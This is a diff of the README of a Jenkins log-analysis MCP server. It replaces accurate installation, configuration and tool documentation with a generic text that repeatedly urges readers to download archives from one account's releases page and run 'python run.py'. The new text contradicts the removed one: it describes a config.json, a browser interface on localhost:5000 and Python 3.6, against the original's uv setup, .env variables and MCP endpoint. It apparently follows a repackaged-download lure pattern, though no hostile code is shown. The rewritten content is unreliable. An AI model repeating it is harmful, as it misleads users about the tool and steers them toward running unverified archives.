@@ -1,223 +1,111 @@
-# Jenkins MCP Server
+# 🛠️ jenkins-mcp-server - Simplified Log Analysis for Jenkins
 
-A Model Context Protocol (MCP) server for fetching and analyzing Jenkins build console logs. Supports multiple Jenkins instances (named configurations) and automatic instance detection from job URLs.
+[![Download jenkins-mcp-server](https://img.shields.io/badge/Download%20Now-jenkins--mcp--server-blue.svg)](https://github.com/MauManto/jenkins-mcp-server/releases)
 
+## 🚀 Getting Started
 
-## Features
+Welcome to the jenkins-mcp-server repository! This application helps you fetch and analyze Jenkins console logs from multiple Jenkins instances seamlessly. You can extract important information such as error snippets, git information, and build metadata. Follow the steps below to get started.
 
-- **Get Console Logs**: Fetch complete console output from Jenkins builds
-- **Analyze Build Errors**: Extract error snippets with context from large logs
-- **Extract Git Repositories**: Identify git repositories, branches, and commits used in builds
-- **Get Build Information**: Retrieve build metadata (status, duration, triggers, etc.)
+## 📦 System Requirements
 
-## Installation
+To run jenkins-mcp-server, ensure your system meets the following requirements:
 
-1. Clone the repository:
-```bash
-git clone <repository-url>
-cd jenkins-mcp-server
-```
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.6 or higher
+- **Memory:** At least 1 GB of RAM available
+- **Disk Space:** 50 MB of free space
 
-2. Install dependencies:
-```bash
-uv sync
-```
+## 🔗 Download & Install
 
-## Configuration
+To download jenkins-mcp-server, visit this page:
 
-1. Create a `.env` file in the root directory (use `.env.example` as a template):
-```bash
-cp .env.example .env
-```
+[Download jenkins-mcp-server](https://github.com/MauManto/jenkins-mcp-server/releases)
 
-2. Configure your Jenkins credentials:
+Follow the instructions below to install the application on your system.
 
-### Single Jenkins Instance
-For a single Jenkins server:
-```env
-JENKINS_URL=https://your-jenkins-instance.com
-JENKINS_USER=your_username
-JENKINS_API_TOKEN=your_api_token
-```
+### Step 1: Visit the Releases Page
 
-### Multiple Jenkins Instances
-If you have multiple Jenkins servers (e.g., legacy and current), you can configure them using named instances:
+Click on the link above to go to the Releases page. Here, you will find the latest version of the jenkins-mcp-server.
 
-```env
-# Default instance (backward compatible)
-JENKINS_URL=https://jenkins.example.com
-JENKINS_USER=default_user
-JENKINS_API_TOKEN=default_token
+### Step 2: Choose the Latest Release
 
-# Legacy Jenkins
-JENKINS_LEGACY_URL=https://jenkins-legacy.example.com
-JENKINS_LEGACY_USER=legacy_user
-JENKINS_LEGACY_API_TOKEN=legacy_token
+On the Releases page, identify the most recent version. It will be marked as the “latest release.”
 
-# Current/Production Jenkins
-JENKINS_CURRENT_URL=https://jenkins.production.example.com
-JENKINS_CURRENT_USER=current_user
-JENKINS_CURRENT_API_TOKEN=current_token
-```
+### Step 3: Download the Application
 
-When using multiple instances, provide the **full Jenkins job URL** and the server will automatically use the correct instance:
-- Example: `"https://jenkins-legacy.example.com/job/MyFolder/job/MyJob/lastBuild"`
+Select the relevant file for your operating system. Click to download it directly. The files are typically in the form of a `.zip` or `.tar.gz` archive.
 
-The server matches the URL against configured instances and uses the appropriate credentials.
+### Step 4: Extract the Files
 
-### Getting a Jenkins API Token
+Once the download completes, locate the downloaded file on your computer. Extract it to a folder of your choice. Right-click the file and look for options like "Extract Here" or use your preferred extraction software.
 
-1. Log in to your Jenkins instance
-2. Click on your username in the top-right corner
-3. Click "Configure"
-4. Under "API Token", click "Add new Token"
-5. Give it a name and click "Generate"
-6. Copy the token and add it to your `.env` file
+### Step 5: Run the Application
 
-## Usage
-
-### Running the Server
+Navigate to the extracted folder. You should find a script named `run.py`. Open your terminal or command prompt in this folder. Run the following command:
 
 ```bash
-uv run jenkins-mcp-server
+python run.py
 ```
 
-Or run the Python file directly:
-```bash
-uv run python main.py
-```
+This command will start the jenkins-mcp-server.
 
-The server will start on `http://0.0.0.0:3000/mcp` (configurable via `SERVER_PORT` and `SERVER_PATH` environment variables)
+## ⚙️ Configuration
 
-### Available Tools
+Before you begin using the server, you need to set up a configuration file. Here’s how:
 
-All tools require a **full Jenkins job URL** including the build number or alias.
+1. In the extracted folder, look for `config.json`. This file contains settings for the application.
+2. Open `config.json` in a text editor. You will need to add your Jenkins server details here. A sample configuration looks like this:
 
-**URL Format:**
-```
-https://jenkins.example.com/job/JobName/job/SubJob/lastBuild
-```
+   ```json
+   {
+       "servers": [
+           {
+               "url": "http://your_jenkins_server:8080",
+               "username": "your_username",
+               "api_token": "your_api_token"
+           }
+       ]
+   }
+   ```
 
-**Build Aliases:**
-- `lastBuild` - Most recent build
-- `lastSuccessfulBuild` - Most recent successful build
-- `lastFailedBuild` - Most recent failed build
-- `lastCompletedBuild` - Most recent completed build
+3. Save the changes to the configuration file.
 
-#### 1. `get_jenkins_console_log`
-Fetch the complete console log for a Jenkins build.
+## 🚦 Usage
 
-**Parameters:**
-- `job_url` (required): Full Jenkins job URL
+With jenkins-mcp-server running, you can navigate to your browser to access the interface:
 
-**Example:**
-```python
-get_jenkins_console_log(
-    job_url="https://jenkins.example.com/job/MyProject/job/my-application/123"
-)
-```
+- Open your web browser and go to `http://localhost:5000`.
+- You will see options for fetching logs. Enter the build number of the Jenkins job you're interested in.
 
-#### 2. `analyze_jenkins_build_errors`
-Analyze a build log and extract error snippets. For large logs, it automatically extracts relevant error sections with surrounding context.
+## 📊 Features
 
-**Parameters:**
-- `job_url` (required): Full Jenkins job URL
+jenkins-mcp-server offers:
 
-**Example:**
-```python
-analyze_jenkins_build_errors(
-    job_url="https://jenkins.example.com/job/MyProject/job/my-application/lastFailedBuild"
-)
-```
+- **Multi-Jenkins Support:** Fetch logs from multiple Jenkins instances.
+- **Error Snippet Extraction:** Quickly find and analyze errors.
+- **Build Metadata:** Extract useful information about builds.
+- **User-Friendly Interface:** Easy navigation to fetch logs.
 
-#### 3. `get_jenkins_git_repositories`
-Extract git repository information from a build's console log. Returns deduplicated list of repositories with URLs, branches, and commit hashes.
+## 🔍 Troubleshooting
 
-**Parameters:**
-- `job_url` (required): Full Jenkins job URL
+If you encounter any issues:
 
-**Example:**
-```python
-get_jenkins_git_repositories(
-    job_url="https://jenkins.example.com/job/MyProject/job/my-application/lastBuild"
-)
-```
+- **Application Not Starting:** Ensure Python is installed and the version is 3.6 or higher.
+- **Configuration Errors:** Check your `config.json` file for typos or incorrect details.
+- **Network Issues:** Ensure that your Jenkins server is reachable and running.
 
-#### 4. `get_jenkins_build_info`
-Get metadata about a Jenkins build (status, duration, timestamp, etc.).
+## 💌 Feedback & Support
 
-**Parameters:**
-- `job_url` (required): Full Jenkins job URL
+We value your feedback! If you have questions or issues, please contact the project maintainers. For support, you can open an issue in this repository.
 
-**Example:**
-```python
-get_jenkins_build_info(
-    job_url="https://jenkins.example.com/job/MyProject/job/my-application/123"
-)
-```
+## 📝 License
 
-## Configuration Options
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-You can customize the behavior using environment variables:
+For any updates, keep checking the [Releases page](https://github.com/MauManto/jenkins-mcp-server/releases).
 
-- `JENKINS_URL`: Your Jenkins instance URL
-- `JENKINS_USER`: Your Jenkins username
-- `JENKINS_API_TOKEN`: Your Jenkins API token
-- `JENKINS_VERIFY_SSL`: Enable/disable SSL certificate verification (default: `true`). Set to `false` for self-signed certificates
-- `MAX_LOG_SIZE`: Maximum log size (in characters) before extracting snippets (default: 250000)
-- `CONTEXT_WINDOW`: Number of lines to include around errors (default: 2)
-- `HTTP_TIMEOUT`: Overall HTTP request timeout in seconds (default: 30)
-- `HTTP_CONNECT_TIMEOUT`: HTTP connection timeout in seconds (default: 10)
-- `HTTP_READ_TIMEOUT`: HTTP read timeout in seconds (default: 120)
-- `HTTP_WRITE_TIMEOUT`: HTTP write timeout in seconds (default: 10)
-- `SERVER_PORT`: Port the MCP server listens on (default: 3000)
-- `SERVER_PATH`: Path for the MCP endpoint (default: /mcp)
-- `DEBUG`: Enable verbose debug logging (default: `false`). Set to `true` to see detailed logs including instance detection, API calls, and response sizes
+## 📥 Download jenkins-mcp-server
 
-### Debug Mode
+Ready to get started? Download the application from:
 
-Enable verbose logging to see detailed information about instance detection, API calls, and responses:
-
-```env
-DEBUG=true
-```
-
-When enabled, you'll see output like:
-```
-🔧 Configuration loaded (DEBUG MODE ENABLED):
-   Jenkins instances configured: 2
-     - https://jenkins.example.com (user: your_user)
-     - https://jenkins-legacy.example.com (user: legacy_user)
-   ...
-```
-
-### SSL Certificate Issues
-
-If you're connecting to a Jenkins instance with a self-signed certificate and encounter SSL errors, you can disable SSL verification:
-
-```env
-JENKINS_VERIFY_SSL=false
-```
-
-**Note:** Disabling SSL verification should only be used in development/staging environments. For production, use proper SSL certificates.
-
-## Development
-
-### Running Tests
-```bash
-uv run pytest
-```
-
-### Linting
-```bash
-uv run ruff check .
-```
-
-### Type Checking
-```bash
-uv run pyright
-```
-
-## License
-
-MIT
+[Download jenkins-mcp-server](https://github.com/MauManto/jenkins-mcp-server/releases)
